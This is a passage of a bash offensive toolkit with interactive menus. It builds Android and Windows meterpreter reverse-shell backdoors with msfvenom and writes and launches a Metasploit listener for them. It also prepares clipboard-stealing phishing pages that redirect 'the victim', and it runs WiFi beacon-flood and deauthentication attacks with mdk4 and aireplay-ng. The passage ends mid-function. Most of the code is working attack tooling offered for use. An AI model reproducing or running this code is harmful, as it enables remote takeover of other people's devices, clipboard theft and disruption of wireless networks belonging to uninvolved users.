    elif [[ ${backdoors_menu} == "02" ]] || [[ ${backdoors_menu} == "2" ]];then
    backdoor_payload_type="windows"
    backdoor_windows
    elif [[ ${backdoors_menu} == "00" ]] || [[ ${backdoors_menu} == "0" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    backdoors_menu
    fi
}

#Android Backdoor Create
backdoor_android(){
    clear
    banner
    echo -e "${bluebold}[* ANDROID *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter HOST/IP.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' backdoor_android_host

    clear
    banner
    echo -e "${bluebold}[* ANDROID *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter PORT.${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Host/IP-->${reset} ${whitebold}${backdoor_android_host}${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' backdoor_android_port

    clear
    banner
    echo -e "${bluebold}[* ANDROID *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter NAME.${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Host -->${reset} ${whitebold}${backdoor_android_host}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Port -->${reset} ${whitebold}${backdoor_android_port}${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' backdoor_android_name

    backdoor_android_continue
}

#Android Backdoor Create
backdoor_android_continue(){
    clear
    banner
    echo -e "${bluebold}[* ANDROID *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Continue?${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Host -->${reset} ${whitebold}${backdoor_android_host}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Port -->${reset} ${whitebold}${backdoor_android_port}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Name -->${reset} ${whitebold}${backdoor_android_name}${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] CREATE${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EDIT${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' backdoor_android_continue

    if [[ ${backdoor_android_continue} == "01" ]] || [[ ${backdoor_android_continue} == "1" ]];then
    clear
    banner
    echo -e "${bluebold}[* ANDROID *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Creating APK Backdoor...${reset}"
    sleep 2
    clear
    banner
    echo -e "${bluebold}[* ANDROID *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Please Wait...${reset}"
    sleep 1
    msfvenom -p android/meterpreter/reverse_tcp LHOST=${backdoor_android_host} LPORT=${backdoor_android_port} -o ${script_dir}/${backdoor_android_name}.apk
    sleep 5
    clear
    banner
    echo -e "${bluebold}[* ANDROID *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Payload created successfully.${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Payload Saved In${reset} ${script_dir}/${backdoor_android_name}.apk"
    sleep 2.5
    backdoor_listener_create
    elif [[ ${backdoor_android_continue} == "00" ]] || [[ ${backdoor_android_continue} == "0" ]];then
    backdoor_android
    else
    clear
    banner
    error_404
    sleep 1
    backdoor_android_continue
    fi
}

#Windows Backdoor Create
backdoor_windows(){
    clear
    banner
    echo -e "${bluebold}[* WINDOWS *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter HOST/IP.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' backdoor_windows_host

    clear
    banner
    echo -e "${bluebold}[* WINDOWS *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter PORT.${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Host-->${reset} ${whitebold}${backdoor_windows_host}${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' backdoor_windows_port

    clear
    banner
    echo -e "${bluebold}[* WINDOWS *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter NAME.${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Host -->${reset} ${whitebold}${backdoor_windows_host}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Port -->${reset} ${whitebold}${backdoor_windows_port}${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' backdoor_windows_name

    backdoor_windows_continue
}

#Windows Backdoor Create
backdoor_windows_continue(){
    clear
    banner
    echo -e "${bluebold}[* WINDOWS *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Continue?${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Host -->${reset} ${whitebold}${backdoor_windows_host}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Port -->${reset} ${whitebold}${backdoor_windows_port}${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Name -->${reset} ${whitebold}${backdoor_windows_name}${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] CREATE${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EDIT${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' backdoor_windows_continue

    if [[ ${backdoor_windows_continue} == "01" ]] || [[ ${backdoor_windows_continue} == "1" ]];then
    clear
    banner
    echo -e "${bluebold}[* WINDOWS *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Creating EXE Backdoor...${reset}"
    sleep 2
    clear
    banner
    echo -e "${bluebold}[* WINDOWS *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Please Wait...${reset}"
    sleep 1
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=${backdoor_windows_host} LPORT=${backdoor_windows_port} -f exe -o ${script_dir}/${backdoor_windows_name}.exe
    sleep 1
    clear
    banner
    echo -e "${bluebold}[* WINDOWS *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Payload created successfully.${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Payload Saved In${reset} ${script_dir}/${backdoor_windows_name}.exe"
    sleep 2.5
    backdoor_listener_create
    elif [[ ${backdoor_windows_continue} == "00" ]] || [[ ${backdoor_windows_continue} == "0" ]];then
    backdoor_windows
    else
    clear
    banner
    error_404
    sleep 1
    backdoor_windows_continue
    fi
}

#Listener Create
backdoor_listener_create(){
    clear
    banner
    echo -e "${bluebold}[* LISTENER *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Do you want to create the listener?${reset} ${whitebold}(Y/N)${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' backdoor_listener_create
    
    if [[ ${backdoor_listener_create} == "y" ]] || [[ ${backdoor_listener_create} == "Y" ]];then
    clear
    banner
    echo -e "${bluebold}[* LISTENER *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter NAME.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' backdoor_listener_name

    cd ${script_dir} || exit_script
    backdoor_listener_save="
    use exploit/multi/handler
    set payload ${backdoor_payload_type}/meterpreter/reverse_tcp
    show options"
    echo "${backdoor_listener_save}" >> "${script_dir}/${backdoor_listener_name}.rc"
    clear
    banner
    echo -e "${bluebold}[* LISTENER *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Listener created successfully.${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] Listener Saved In${reset} ${script_dir}/${backdoor_listener_name}.rc"
    sleep 2.5
    backdoor_listener_start
    elif [[ ${backdoor_listener_create} == "n" ]] || [[ ${backdoor_listener_create} == "N" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    backdoor_listener_create
    fi
}

#Start Listener Option
backdoor_listener_start(){
    clear
    banner
    echo -e "${bluebold}[* LISTENER *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Do you want to start listening now?${reset} ${whitebold}(Y/N)${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' backdoor_listener_start
    
    if [[ ${backdoor_listener_start} == "y" ]] || [[ ${backdoor_listener_start} == "Y" ]];then
    clear
    banner
    echo -e "${orangebold}[${reset}*${orangebold}] Starting Listener...${reset}"
    sleep 4
    clear
    msfconsole -r ${backdoor_listener_name}.rc
    elif [[ ${backdoor_listener_start} == "n" ]] || [[ ${backdoor_listener_start} == "N" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    backdoor_listener_start
    fi
}

#Clipboard Hacks Menu
clipboard_menu(){
    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Send Text${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Get Text${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' clipboard_menu

    if [[ ${clipboard_menu} == "1" ]] || [[ ${clipboard_menu} == "01" ]];then
    site="clipboard/sendtext"
    clipboard_send
    elif [[ ${clipboard_menu} == "2" ]] || [[ ${clipboard_menu} == "02" ]];then
    site="clipboard/gettext"
    clipboard_get
    elif [[ ${clipboard_menu} == "0" ]] || [[ ${clipboard_menu} == "00" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    beaconmenu
    fi
}

#Send Clipboard
clipboard_send(){
    clear
    banner
    echo -e "${bluebold}[* CLIPBOARD *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter text to send.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' clipboard_send_text

    clear
    banner
    echo -e "${bluebold}[* CLIPBOARD *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter the link to redirect the victim.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' clipboard_send_url

    cd ${script_dir}/.sites/${site} || exit_script
    sed "s/SEND_TEXT/${clipboard_send_text}/g; s#REDIR_URL#${clipboard_send_url}#g" maintemplate.html > main.html
    sleep 1
    select_server
}

#Get Clipboard
clipboard_get(){
    clear
    banner
    echo -e "${bluebold}[* CLIPBOARD *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter the link to redirect the victim.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' clipboard_get_url

    cd ${script_dir}/.sites/${site} || exit_script
    sed "s#REDIR_URL#${clipboard_get_url}#g" maintemplate.html > main.html
    sleep 1
    select_server
}

#Network Menu
network_menu(){
    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Beacon Flood${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Deauth${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] Mac Changer${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] Host Scanner${reset}"
    echo -e "${bluebold}[${reset}99${bluebold}] Restart Network Services${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_menu

    if [[ ${network_menu} == "01" ]] || [[ ${network_menu} == "1" ]];then
    NETWORKRST="TRUE"
    network_beacon_flood_interface
    elif [[ ${network_menu} == "02" ]] || [[ ${network_menu} == "2" ]];then
    NETWORKRST="TRUE"
    network_deauther
    elif [[ ${network_menu} == "03" ]] || [[ ${network_menu} == "3" ]];then
    NETWORKRST="TRUE"
    network_macchanger
    elif [[ ${network_menu} == "04" ]] || [[ ${network_menu} == "4" ]];then
    host_scanner
    elif [[ ${network_menu} == "99" ]] || [[ ${network_menu} == "99" ]];then
    network_restart
    elif [[ ${network_menu} == "00" ]] || [[ ${network_menu} == "0" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    network_menu
    fi
}

#Beacon Flood Interface Select
network_beacon_flood_interface(){
    clear
    banner
    echo -e "${bluebold}[* SELECT INTERFACE *]${reset}"
    echo -e ""
    for i in $(seq 1 "$num_interfaces"); do
    printf "${bluebold}[${reset}0%d${bluebold}] %s${reset}\n" "$i" "$(echo "$wlan_interfaces" | sed -n "${i}p")"
    done
    echo -e "${bluebold}[${reset}00${bluebold}] BACK ${reset}" 
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_beacon_flood_interface

    selected_interface=$(echo "$wlan_interfaces" | sed -n "${network_beacon_flood_interface}p")

    if [[ "$network_beacon_flood_interface" != 0 && "$network_beacon_flood_interface" != 00 && "$network_beacon_flood_interface" =~ ^[0-9]+$ ]]; then
    airmon-ng check kill &>/dev/null
    ifconfig ${selected_interface} down
    iwconfig ${selected_interface} mode Monitor
    ifconfig ${selected_interface} up
    network_beacon_flood_menu
    elif [[ ${network_beacon_flood_interface} == "00" ]] || [[ ${network_beacon_flood_interface} == "0" ]];then
    network_menu
    else
    clear
    banner
    error_404
    sleep 1
    network_beacon_flood_interface
    fi
}

#Beacon Flood Menu
network_beacon_flood_menu(){
    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] With Custom SSID List${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] With Random SSID${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] Select Network${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_beacon_flood_menu

    if [[ ${network_beacon_flood_menu} == "1" ]] || [[ ${network_beacon_flood_menu} == "01" ]];then
    network_beacon_flood_custom_ssid
    elif [[ ${network_beacon_flood_menu} == "2" ]] || [[ ${network_beacon_flood_menu} == "02" ]];then
    network_beacon_flood_random_ssid
    elif [[ ${network_beacon_flood_menu} == "3" ]] || [[ ${network_beacon_flood_menu} == "03" ]];then
    #Detect Key Interrupt
    trap network_beacon_attack_ssid_select INT
    cd ${script_dir}/.files || exit_script
    rm -rf *.csv
    airodump-ng -w wifi --write-interval 1 --output-format csv ${selected_interface} > /dev/null 2>&1 &
    network_beacon_attack_ssid
    elif [[ ${network_beacon_flood_menu} == "0" ]] || [[ ${network_beacon_flood_menu} == "00" ]];then
    network_menu
    else
    clear
    banner
    error_404
    sleep 1
    network_beacon_flood_menu
    fi
}

#Custom SSID Attack
network_beacon_flood_custom_ssid(){
    clear
    banner
    echo -e "${bluebold}[* BEACON FLOOD *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] SSID wordlist directory.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_beacon_flood_custom_ssid

    if [[ -z ${network_beacon_flood_custom_ssid} ]];then
    clear
    error_404
    sleep 1
    network_beacon_flood_custom_ssid
    fi
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                         ATTACK STARTED "
    echo -e "                            CTRL + C "
    echo -e "                              STOP "
    echo -e "${reset}"
    if ! [[ $(mdk4 ${selected_interface} b -f ${network_beacon_flood_custom_ssid} -s 500) ]];then
    :
    else
    clear
    banner
    error_404
    sleep 1
    network_beacon_flood_menu
    fi
}

#Random SSID Attack
network_beacon_flood_random_ssid(){
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                         ATTACK STARTED "
    echo -e "                            CTRL + C "
    echo -e "                              STOP "
    echo -e "${reset}"
    if ! [[ $(mdk4 ${selected_interface} b -s 500) ]];then
    :
    else
    clear
    banner
    error_404
    sleep 1
    network_beacon_flood_menu
    fi
}

#Scan Wifi Networks Deauth
network_beacon_attack_ssid(){    
    for (( ; ; )) do
    sleep 0.5
    clear
    banner
    echo -e "${bluebold}[* BEACON FLOOD *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Scanning network.${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] CTRL+C To Stop Scan...${reset}"
    echo -e ""
    echo -e "${greenbold}N°\tBSSID\t\t\t CHAN\t AUTH\t ESSID${reset}${orangebold}" && cat wifi-01.csv | sed -e 's/^,/ NULL,/' -e 's/, ,/, NULL,/g' -e 's/,   ,/, NULL,/g' -e 's/,$/, NULL/' | awk -F "\"*,\"*" 'NR >2 { print "\t" $1 "\t" $4 "\t" $8 "\t" $14 }' | sed -n '/Station/q;p' | sed '/^[[:space:]]*$/d' | awk '{print NR,$0}'
    sleep 1
    done
}

#Beacon Attack Scan
network_beacon_attack_ssid_select(){
    #Detect Key Interrupt
    trap exit_script INT
   
    clear
    banner
    sleep 1
    echo -e "${bluebold}[* BEACON FLOOD *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Select network.${reset}"
    echo -e ""
    echo -e "${greenbold}N°\tBSSID\t\t\t CHAN\t AUTH\t ESSID${reset}${orangebold}" && cat wifi-01.csv | sed -e 's/^,/ NULL,/' -e 's/, ,/, NULL,/g' -e 's/,   ,/, NULL,/g' -e 's/,$/, NULL/' | awk -F, 'NR > 2 { print "\t" $1 "\t" $4 "\t" $8 "\t" $14 }' | sed -n '/Station/q;p' | sed '/^[[:space:]]*$/d' | awk '{print NR,$0}'
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_beacon_attack_ssid_select

    network_beacon_attack_ssid_select_csv=$((${network_beacon_attack_ssid_select} + 2))

    NAME=$(cat wifi-01.csv | sed -e 's/^,/ NULL,/' -e 's/, ,/, NULL,/g' -e 's/,   ,/, NULL,/g' -e 's/,$/, NULL/' | awk -F "\"*,\"*" '{print $14}' | sed -n '/Station/q;p' | sed -n -e ''${network_beacon_attack_ssid_select_csv}'{p;q}')
    CHANNEL=$(cat wifi-01.csv | sed -e 's/^,/ NULL,/' -e 's/, ,/, NULL,/g' -e 's/,   ,/, NULL,/g' -e 's/,$/, NULL/' | awk -F "\"*,\"*" '{print $4}' | sed -n '/Station/q;p' | sed -n -e ''${network_beacon_attack_ssid_select_csv}'{p;q}')

    OPTNAME=("${NAME}")
    OPTCHANNEL=("${CHANNEL}")

    clear
    banner
    echo -e "${orangebold}"
    echo -e "                         ATTACK STARTED "
    echo -e "                            CTRL + C "
    echo -e "                              STOP "
    echo -e "${reset}"
    if ! [[ $(mdk4 ${selected_interface} b -n "${OPTNAME[*]}" -c "${OPTCHANNEL[*]}" -s 1000 -h) ]];then
    echo -e ""
    else
    clear
    banner
    error_404
    sleep 1
    network_beacon_flood_menu
    fi
}

#Deauth Network Menu
network_deauther(){
    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] WiFi (Single Network 2.4GHz)${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Host (Multiple Clients 2.4Ghz)${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_deauther

    if [[ ${network_deauther} == "1" ]] || [[ ${network_deauther} == "01" ]];then
    network_deauther_single_interface
    elif [[ ${network_deauther} == "2" ]] || [[ ${network_deauther} == "02" ]];then
    network_host_deauth
    elif [[ ${network_deauther} == "0" ]] || [[ ${network_deauther} == "00" ]];then
    network_menu
    else
    clear
    banner
    error_404
    sleep 1
    network_deauther
    fi
}

#Select Wifi Interface
network_deauther_single_interface(){
    #Detect Key Interrupt
    trap network_deauther_select INT
    clear
    banner
    echo -e "${bluebold}[* SELECT INTERFACE *]${reset}"
    echo -e ""

    for i in $(seq 1 "$num_interfaces"); do
    printf "${bluebold}[${reset}0%d${bluebold}] %s${reset}\n" "$i" "$(echo "$wlan_interfaces" | sed -n "${i}p")"
    done
    echo -e "${bluebold}[${reset}00${bluebold}] BACK ${reset}" 
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_deauther_single_interface

    selected_interface=$(echo "$wlan_interfaces" | sed -n "${network_deauther_single_interface}p")

    if [[ "$network_deauther_single_interface" != 0 && "$network_deauther_single_interface" != 00 && "$network_deauther_single_interface" =~ ^[0-9]+$ ]]; then
    clear
    banner
    monitor_mode_starting
    sleep 1
    airmon-ng check kill &>/dev/null
    airmon-ng start ${selected_interface} &>/dev/null
    cd ${script_dir}/.files || exit_script
    rm -rf *.csv
    airodump-ng -w wifi --write-interval 1 --output-format csv ${selected_interface}mon > /dev/null 2>&1 &
    clear
    banner
    monitor_mode_started
    sleep 1
    network_deauther_scan
    elif [[ ${network_deauther_single_interface} == "00" ]] || [[ ${network_deauther_single_interface} == "0" ]];then
    network_deauther
    else
    clear
    banner
    error_404
    sleep 1
    network_deauther_single_interface
    fi
}

#Scan Wifi Networks Deauth
network_deauther_scan(){    
    for (( ; ; )) do
    sleep 0.5
    clear
    banner
    echo -e "${bluebold}[* DEAUTH *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Scanning network.${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] CTRL+C To Stop Scan...${reset}"
    echo -e ""
    echo -e "${greenbold}N°\tBSSID\t\t\t CHAN\t AUTH\t ESSID${reset}${orangebold}" && cat wifi-01.csv | sed -e 's/^,/ NULL,/' -e 's/, ,/, NULL,/g' -e 's/,   ,/, NULL,/g' -e 's/,$/, NULL/' | awk -F "\"*,\"*" 'NR >2 { print "\t" $1 "\t" $4 "\t" $8 "\t" $14 }' | sed -n '/Station/q;p' | sed '/^[[:space:]]*$/d' | awk '{print NR,$0}'
    sleep 1
    done
}

#Select And Deauth Wifi Network
network_deauther_select(){
    #Detect Key Interrupt
    trap exit_script INT
   
    clear
    banner
    sleep 1
    echo -e "${bluebold}[* DEAUTH *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Select network.${reset}"
    echo -e ""
    echo -e "${greenbold}N°\tBSSID\t\t\t CHAN\t AUTH\t ESSID${reset}${orangebold}" && cat wifi-01.csv | sed -e 's/^,/ NULL,/' -e 's/, ,/, NULL,/g' -e 's/,   ,/, NULL,/g' -e 's/,$/, NULL/' | awk -F, 'NR > 2 { print "\t" $1 "\t" $4 "\t" $8 "\t" $14 }' | sed -n '/Station/q;p' | sed '/^[[:space:]]*$/d' | awk '{print NR,$0}'
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_deauther_select

    network_deauther_select_csv=$((${network_deauther_select} + 2))

    BSSID=$(cat wifi-01.csv | sed -e 's/^,/ NULL,/' -e 's/, ,/, NULL,/g' -e 's/,   ,/, NULL,/g' -e 's/,$/, NULL/' | awk -F "\"*,\"*" '{print $1}' | sed -n '/Station/q;p' | sed -n -e ''${network_deauther_select_csv}'{p;q}')
    CHANNEL=$(cat wifi-01.csv | sed -e 's/^,/ NULL,/' -e 's/, ,/, NULL,/g' -e 's/,   ,/, NULL,/g' -e 's/,$/, NULL/' | awk -F "\"*,\"*" '{print $4}' | sed -n '/Station/q;p' | sed -n -e ''${network_deauther_select_csv}'{p;q}')
    PRIVACY=$(cat wifi-01.csv | sed -e 's/^,/ NULL,/' -e 's/, ,/, NULL,/g' -e 's/,   ,/, NULL,/g' -e 's/,$/, NULL/' | awk -F "\"*,\"*" '{print $6}' | sed -n '/Station/q;p' | sed -n -e ''${network_deauther_select_csv}'{p;q}')
    AUTH=$(cat wifi-01.csv | sed -e 's/^,/ NULL,/' -e 's/, ,/, NULL,/g' -e 's/,   ,/, NULL,/g' -e 's/,$/, NULL/' | awk -F "\"*,\"*" '{print $8}' | sed -n '/Station/q;p' | sed -n -e ''${network_deauther_select_csv}'{p;q}')
    NAME=$(cat wifi-01.csv | sed -e 's/^,/ NULL,/' -e 's/, ,/, NULL,/g' -e 's/,   ,/, NULL,/g' -e 's/,$/, NULL/' | awk -F "\"*,\"*" '{print $14}' | sed -n '/Station/q;p' | sed -n -e ''${network_deauther_select_csv}'{p;q}')

    OPTBSSID=("${BSSID}")
    OPTCHANNEL=("${CHANNEL}")
    OPTPRIVACY=("${PRIVACY}")
    OPTAUTH=("${AUTH}")
    OPTNAME=("${NAME}")

    airmon-ng start ${selected_interface}mon ${OPTCHANNEL[*]} &>/dev/null
    aireplay-ng --deauth 0 -a ${OPTBSSID[*]} ${selected_interface}mon > /dev/null 2>&1 &

    for (( TIME=1; TIME<=9999; TIME++ )) do
    clear
    banner
    echo -e "${bluebold}[* DEAUTH *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Sending Deauthing Packets CTRL+C To Stop Attack...${reset}"
    echo -e ""
    echo -e "${greenbold}Time     -->${reset}${orangebold}  ${TIME} Seconds.${reset}"
    echo -e "${greenbold}Name     -->${reset}${orangebold} ${OPTNAME[*]}${reset}"
    echo -e "${greenbold}Channel  -->${reset}${orangebold} ${OPTCHANNEL[*]}${reset}"
    echo -e "${greenbold}Security -->${reset}${orangebold} ${OPTAUTH[*]}${reset}"
    echo -e "${greenbold}Privacy  -->${reset}${orangebold} ${OPTPRIVACY[*]}${reset}"
    echo -e "${greenbold}BSSID    -->${reset}${orangebold}  ${OPTBSSID[*]}${reset}"
    sleep 1
    done
}

network_host_deauth(){
    NETWORKRST="FALSE"
    clear
    banner
    echo -e "${bluebold}[* HOST DEAUTH *]${reset}"
    echo -e ""
    for i in $(seq 1 "$num_interfaces"); do
    printf "${bluebold}[${reset}0%d${bluebold}] %s${reset}\n" "$i" "$(echo "$wlan_interfaces" | sed -n "${i}p")"
    done
    echo -e "${bluebold}[${reset}00${bluebold}] BACK ${reset}" 
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_host_deauth_interface

    selected_interface=$(echo "$wlan_interfaces" | sed -n "${network_host_deauth_interface}p")

    if [[ "$network_host_deauth_interface" != 0 && "$network_host_deauth_interface" != 00 && "$network_host_deauth_interface" =~ ^[0-9]+$ ]]; then
    clear
    banner
    echo -e "${bluebold}[* HOST DEAUTH *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Configuring Gateway...${reset}"

    route=$(ip route | head -n1)
    GATEWAYIP=$(echo "$route" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
    GATEWAYMAC=$(arping -c 1 -i ${selected_interface} $(netstat -nr | grep "${selected_interface}" | awk '$1 == "0.0.0.0"{print$2}') | grep -o -E '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}')
    GATEWAYVENDOR=$(curl -s https://api.macvendors.com/${GATEWAYMAC})
    sleep 0.5
    clear
    banner
    echo -e "${bluebold}[* HOST DEAUTH *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Configuring LocalHost...${reset}"
    LOCALIP=$(ifconfig | awk "/${selected_interface}/,/inet/" | grep "inet" | cut -d " " -f 10 | awk 'NR==1{print $1}')
    LOCALMAC=$(ifconfig | awk "/${selected_interface}/,/ether/" | grep "ether" | cut -d " " -f 10 | awk 'NR==1{print $1}')
    LOCALVENDOR=$(curl -s https://api.macvendors.com/${LOCALMAC} | sed -e 'p' | awk 'NR==1{print $1}')
    INTIP255=$(ifconfig | awk "/${selected_interface}/,/broadcast/" | grep "broadcast" | cut -d " " -f 10 | cut -d "." -f 1,2,3 | awk 'NR==1{print $1}')
    
    if [[ ${GATEWAYMAC} == "" ]] || [[ ${GATEWAYMAC} == " " ]];then
    clear
    banner
    error_404
    sleep 1
    network_deauther
    fi
    network_host_deauth_scan
    elif [[ ${network_host_deauth_interface} == "0" ]] || [[ ${network_host_deauth_interface} == "00" ]];then
    network_deauther
    else
    clear
    banner
    error_404
    sleep 1
    network_host_deauth
    fi
}

network_host_deauth_scan(){
    cd $script_dir/.files || exit_script
    clear
    banner
    echo -e "${bluebold}[* HOST DEAUTH *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Scanning Interface:${reset} ${selected_interface} ${greenbold}IP:${reset} ${GATEWAYIP}"
    sed -e "s/CUSTOM_INTERFACE/$selected_interface/g" -e "s/CUSTOM_IP/$INTIP255/g" scan.py.tmp > scan.py
    python scan.py
    sleep 1
    rm -rf scan.py
    cat HOSTS.tmp | (sed -u 1q;sort --field-separator="," -b -k1,1) >> HOSTS.csv
    rm -rf HOSTS.tmp
    sed -i "/${GATEWAYMAC}/d" HOSTS.csv
    NL=$(cat HOSTS.csv | wc -l | xargs)
    for CHK in $(seq 2 ${NL});do
        IP=$(cat HOSTS.csv | awk -F "\"*,\"*" '{print $1}' | sed -n -e ''${CHK}'{p;q}')
        MAC=$(cat HOSTS.csv | awk -F "\"*,\"*" '{print $2}' | sed -n -e ''${CHK}'{p;q}')
        STATUS=$(cat HOSTS.csv | awk -F "\"*,\"*" '{print $3}' | sed -n -e ''${CHK}'{p;q}')
        VENDOR=$(cat HOSTS.csv | awk -F "\"*,\"*" '{print $4}' | sed -n -e ''${CHK}'{p;q}')
        sleep 0.5
    done
